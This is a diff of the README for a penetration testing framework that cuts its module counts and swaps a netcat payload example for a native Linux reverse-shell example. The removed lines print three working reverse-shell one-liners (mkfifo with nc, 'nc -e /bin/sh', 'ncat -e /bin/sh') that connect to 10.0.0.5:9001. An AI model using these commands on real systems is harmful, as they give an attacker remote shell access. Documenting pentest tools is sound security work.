@@ -21,10 +21,10 @@ Amatsumara is a penetration testing framework built for performance and safety. 
 | | Count |
 |---|---|
 | Exploit Modules | 6 |
-| Auxiliary Modules | 18 |
+| Auxiliary Modules | 4 |
 | Utility Modules | 1 |
 | Post-Exploitation Modules | 1 |
-| Payload Generators | 9 |
+| Payload Generators | 2 |
 
 > **[Module Documentation](docs/MODULES.md)** — detailed options, usage examples, caveats, and references for every exploit and auxiliary module.
 
@@ -155,25 +155,14 @@ amatsumara > jobs
   1     Multi Handler    12s
 ```
 
-### Generating Payloads
+### Native Payloads
 
 ```
-amatsumara > use Unix Netcat Reverse TCP
-amatsumara Unix Netcat Reverse TCP (payload) > forge LHOST 10.0.0.5
-amatsumara Unix Netcat Reverse TCP (payload) > forge LPORT 9001
-amatsumara Unix Netcat Reverse TCP (payload) > strike
-
-[+] Netcat Reverse Shell Payload:
-    Target: 10.0.0.5:9001
-
-=== Option 1: Standard nc with mkfifo ===
-mkfifo /tmp/ivnrm; nc 10.0.0.5 9001 0</tmp/ivnrm | /bin/sh >/tmp/ivnrm 2>&1; rm /tmp/ivnrm
-
-=== Option 2: nc -e (traditional netcat) ===
-nc -e /bin/sh 10.0.0.5 9001
-
-=== Option 3: ncat (nmap netcat) ===
-ncat 10.0.0.5 9001 -e /bin/sh
+amatsumara > use Linux x64 Reverse TCP Shell
+amatsumara Linux x64 Reverse TCP Shell (payload) > forge LHOST 10.0.0.5
+amatsumara Linux x64 Reverse TCP Shell (payload) > forge LPORT 9001
+amatsumara Linux x64 Reverse TCP Shell (payload) > strike
+[*] Connecting to 10.0.0.5:9001
 ```
 
 ---
